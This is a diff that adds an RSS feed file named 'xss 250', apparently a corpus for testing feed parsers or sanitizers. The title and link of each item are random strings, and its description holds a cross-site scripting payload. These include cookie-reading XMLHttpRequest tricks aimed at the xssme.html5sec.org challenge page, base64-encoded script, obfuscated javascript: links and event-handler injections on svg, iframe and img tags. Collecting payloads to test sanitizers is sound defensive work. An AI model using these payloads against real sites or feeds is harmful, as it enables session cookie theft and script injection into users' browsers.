@@ -1,0 +1,183 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+<channel>
+  <title>xss 250</title>
+  <link>https://www.VHXWHWPIBXPSADJDTXAU.com</link>
+  <description>JCONKPACJMTLVUTUNSQZ</description>
+  <item>
+    <title>ZEBGXQVYVCHMAAJKPKIV</title>
+    <link>http://wwww.OOCAAHVGJPHWGQQZINEVYXLTQRLKWUPQDVTVWTGN.com</link>
+    <description>
+      <script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+    </description>
+  </item>
+  <item>
+    <title>FYXRQCCWRGVTUHNBDOPE</title>
+    <link>http://wwww.JNBMZEQKZYLZBEFEBKFWALZJHFRISTIHWAAESVSA.com</link>
+    <description>
+      <textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>
+    </description>
+  </item>
+  <item>
+    <title>GRYFKCBIAWVGJBFHKAFW</title>
+    <link>http://wwww.BBPAAZLLKWXFORMDNTAZURJCEEIBLLEGDTVBVOFZ.com</link>
+    <description>
+      <object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
+    </description>
+  </item>
+  <item>
+    <title>HNOQBUXVNQQVKPYOTLTR</title>
+    <link>http://wwww.AKGIKTIFKPXFPAZHJXISBDUKIMNJWUVIPLLQEYSD.com</link>
+    <description>
+      <script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+    </description>
+  </item>
+  <item>
+    <title>GHQFCFGGEQHTXDGQCEKH</title>
+    <link>http://wwww.YYFCFSZYUPJQTAGIQXDQBXXNTBURDTMSVGUIIYFW.com</link>
+    <description>
+      %3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E
+    </description>
+  </item>
+  <item>
+    <title>DREMZKZRFMBXPSKEDWIB</title>
+    <link>http://wwww.BYEOHHQIXZTQUDYSRAKZVYYKGSUDNAVOMXUFQQHQ.com</link>
+    <description>
+      <iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>
+    </description>
+  </item>
+  <item>
+    <title>TJSRVABFWVSXHFJIUWHS</title>
+    <link>http://wwww.HGEMPPFOHXISKFFOJZRUCTMHMUMIQVRZMYYIBWUH.com</link>
+    <description>
+      <a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E
+    </description>
+  </item>
+  <item>
+    <title>FAKGQLJMDNKVHGKNEKAS</title>
+    <link>http://wwww.XQKDGRAQZYYJFDGUPGPVPUTTFUDQPEJFCWEUGQMT.com</link>
+    <description>
+      <a target="x" href="xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>
+    </description>
+  </item>
+  <item>
+    <title>QUFMUXBRVWKMJKTBUGEI</title>
+    <link>http://wwww.XNMTBAYFVUVFHFRXRZWEQOXOUYVHYFOUXQNIJDEZ.com</link>
+    <description>
+      <a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
+    </description>
+  </item>
+  <item>
+    <title>LCCBYVUTVTTAJIBXXIYD</title>
+    <link>http://wwww.YMZRSJNYUGBVDDWTNFSUCOSCGYEEXWDPMTTXZSAB.com</link>
+    <description>
+      <a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+    </description>
+  </item>
+  <item>
+    <title>ULOBSZGMWFGFQQMYBOJJ</title>
+    <link>http://wwww.ERAYQVKPEBHULUEVAISVZRQHFSFLDXVBVKYZCIFP.com</link>
+    <description>
+      Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>
+    </description>
+  </item>
+  <item>
+    <title>IJLXFFFHSJNJJLSKJQUS</title>
+    <link>http://wwww.SVZJJEDRKPSYOCUBWJNGYLHLDRIYLROQNFLLWIKV.com</link>
+    <description>
+      <a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+    </description>
+  </item>
+  <item>
+    <title>JVIINIKGZXXIBATZURJW</title>
+    <link>http://wwww.VFULESPZBMZWTUENKKYJSFNJKJOKLFYPZVJDVFDM.com</link>
+    <description>
+      <div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+    </description>
+  </item>
+  <item>
+    <title>TAYJSQTWEZJXZSZDPDBO</title>
+    <link>http://wwww.YBHQVQKHWEZMXOHPUHWOOBCBTJOMHJUIRDCXGNLQ.com</link>
+    <description>
+      <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+    </description>
+  </item>
+  <item>
+    <title>LUEVGEXLYONRXOPNYFHI</title>
+    <link>http://wwww.LVESVGYHPDLGYELIFMIKLLKQLUSZGJQJEOVDJFWL.com</link>
+    <description>
+      <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+    </description>
+  </item>
+  <item>
+    <title>VPHAPSYHCFVJKCKFXJEU</title>
+    <link>http://wwww.MSMASIBYVMMWQZLSOYLUBRIPYFWTPFINPWBIXCZE.com</link>
+    <description>
+      <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?
+    </description>
+  </item>
+  <item>
+    <title>QKKHESFSVUFKBFLIMAPD</title>
+    <link>http://wwww.WHLWIGLJRFGDWBNQKVIOMEQNQIVGJPAIRZJZYCSW.com</link>
+    <description>
+      <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
+    </description>
+  </item>
+  <item>
+    <title>INZKDITGLWZZCTCNHOJB</title>
+    <link>http://wwww.IPFXEURJAYEORHWVQGGAXGYHPHHXAAJIHPZZWTOO.com</link>
+    <description>
+      <var onmouseover="prompt(1)">On Mouse Over</var>?
+    </description>
+  </item>
+  <item>
+    <title>NSIVPOIHUBAPTTOAAIBP</title>
+    <link>http://wwww.XXSRGTGLUPVCJHIYVSNKYLIPAJZDQYYYWVGYUJYE.com</link>
+    <description>
+      <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+    </description>
+  </item>
+  <item>
+    <title>ERBVREHWSMYZQKAQMKAN</title>
+    <link>http://wwww.MCHASOIHWPHCUDPBMNSKDXNOGBZSFQOSGBAUWFPJ.com</link>
+    <description>
+      <img src="/" =_=" title="onerror='prompt(1)'">
+    </description>
+  </item>
+  <item>
+    <title>PIRKFQVRXILGQVQAZXGD</title>
+    <link>http://wwww.MNBDGSXZVMBTBREPDOQFMPXHGINLZMFJTNKRIGIU.com</link>
+    <description>
+      <%<!--'%><script>alert(1);</script -->
+    </description>
+  </item>
+  <item>
+    <title>UXOWZIARRXKUGEVPESBT</title>
+    <link>http://wwww.UJFMCMWSPCUFPMMASCDGTVBIHIJJDQVAJHTHGJYN.com</link>
+    <description>
+      <script src="data:text/javascript,alert(1)"></script>
+    </description>
+  </item>
+  <item>
+    <title>ZGVSLQKTXNVGXTNVWWBD</title>
+    <link>http://wwww.IJFIRRHXBBGZXABYQRUXBMDEIPMCWCHTZJPLACMJ.com</link>
+    <description>
+      <iframe/src \/\/onload = prompt(1)
+    </description>
+  </item>
+  <item>
+    <title>DIOUPFTOEHJRHJIPOUGE</title>
+    <link>http://wwww.LLXNLAZELRNGDSWFVVBZEYDHNAPFPCAUJOGQMLOY.com</link>
+    <description>
+      <iframe/onreadystatechange=alert(1)
+    </description>
+  </item>
+  <item>
+    <title>HHPHHYIRPTVJSPMCOEKL</title>
+    <link>http://wwww.VYNQERPXWWACLPUIAIOCARBVXGTNPPHRCBUKDFLB.com</link>
+    <description>
+      <svg/onload=alert(1)
+    </description>
+  </item>
+</channel>
+</rss>
